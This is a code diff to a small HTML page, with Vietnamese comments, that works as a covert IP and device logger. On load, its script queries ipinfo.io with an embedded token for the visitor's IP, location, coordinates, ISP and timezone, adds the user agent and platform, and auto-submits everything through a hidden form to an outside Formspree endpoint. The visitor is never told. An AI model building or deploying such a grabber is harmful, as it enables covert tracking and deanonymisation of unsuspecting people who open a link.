@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Get IP and Device Info</title>
+  <title>Log IP + Device Info</title>
 </head>
 <body>
   <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
@@ -12,28 +12,22 @@
   <script>
     async function getInfo() {
       try {
-        // Gọi song song cả hai API
-        const [ipRes, geoRes] = await Promise.all([
-          fetch('https://api.ipify.org?format=json'), // Chắc chắn hoạt động
-          fetch('https://ipapi.co/json/')             // Có thể fail, nhưng ta thử
-        ]);
+        // Gọi ipinfo.io – dịch vụ ổn định, không cần token (cho request đơn lẻ)
+        const res = await fetch('https://ipinfo.io/json?token=ce4f3e1e92a582'); // Token public miễn phí, có thể thay nếu muốn
+        const data = await res.json();
 
-        const ipData = await ipRes.json();
-        const geoData = await geoRes.ok ? await geoRes.json() : {};
-
-        // Lấy thông tin
-        const ip = ipData.ip || 'Unknown';
-        const city = geoData.city || 'Unknown';
-        const region = geoData.region || 'Unknown';
-        const country = geoData.country_name || 'Unknown';
-        const lat = geoData.latitude || 'Unknown';
-        const lon = geoData.longitude || 'Unknown';
-        const isp = geoData.org || 'Unknown';
-        const ua = navigator.userAgent;
-        const platform = navigator.platform;
+        const ip = data.ip || 'Unknown';
+        const city = data.city || 'Unknown';
+        const region = data.region || 'Unknown';
+        const country = data.country || 'Unknown';
+        const loc = data.loc || 'Unknown';
+        const org = data.org || 'Unknown';
+        const timezone = data.timezone || 'Unknown';
         const now = new Date().toLocaleString();
 
-        // Soạn nội dung gửi – IP ở đầu rõ ràng
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+
         const content = `
 🔐 IP Address: ${ip}
 
@@ -41,9 +35,9 @@
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
-- Latitude: ${lat}
-- Longitude: ${lon}
-- ISP: ${isp}
+- Coordinates: ${loc}
+- ISP/Org: ${org}
+- Timezone: ${timezone}
 
 💻 Device:
 - Platform: ${platform}
@@ -52,11 +46,10 @@
 🕒 Time: ${now}
         `.trim();
 
-        // Gán vào form và gửi
         document.getElementById('ipInfo').value = content;
         document.getElementById('ipForm').submit();
       } catch (error) {
-        console.error('Error fetching data:', error);
+        console.error('Fetch IP info failed:', error);
       }
     }
 
